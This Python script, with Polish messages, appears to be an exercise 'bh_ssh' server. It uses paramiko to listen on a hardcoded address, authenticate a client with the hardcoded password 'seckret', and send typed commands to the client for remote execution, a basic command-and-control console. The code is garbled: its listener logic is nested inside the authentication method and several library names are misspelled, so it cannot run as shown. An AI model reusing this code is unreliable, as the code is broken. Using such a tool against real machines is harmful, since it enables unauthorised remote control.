import os
import paramiko
import socket
import sys
import threading

CWD = os.path.dirname(os.path.realpath(__file__))
HOSTKEY = paramiko.RSAKey(filename=os.path.join(CWD, 'test_rsa.key'))

class Server (paramiko.ServerInterface):
    def __init__(self):
        self.event= threading.Event()

    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCESSED
        return paramiko.OPEN_FAILED_ADMINISRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == 'tim') and (password == 'seckret'):
            if __name__ == '__main__':
                server = '192.168.1.207'
                ssh_port = 2222
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.setsockopt(socket.SQL_SOCKET, socket.SO_RCVBUFREUSEADDR, 1)
                    sock.bind((server, ssh_port))
                    sock.listen(100)
                    print('[+]Nasłuchiwanie połączenia...   ')
                    client, addr = sock.accept()
                except Exception as e:
                    print('[-] Problem z nasłuchiwaniem :' + str(e))
                    sys.exit(1)
                else:
                    print(f'[+] Odebrane połączenie od {addr}')


            bhSession = paramiko.Trasport(client)
            bhSession.add_server_key(HOSTKEY)
            server = Server()
            bhSession.start_server(server = server)

            chan = bhSession.accept(20)
            if chan is None:
                print('***Brak kanału.')
                sys.exit()

        print('[+] Uwierzytenienony !!')
        print(chan.recv(1024).decode())
        chan.send('Witaj w bh_ssh')
        try:
            while True:
                command = input("Podaj polecenie : ")
                if command != 'exit':
                    chan.send(command)
                    r = chan.recv(8192)
                    print(r.decode())
                else:
                    chan.send('exit')
                    print('Koniec')
                    bhSession.close()
                    break

        except KeyboardInterrupt:
            bhSession.close()



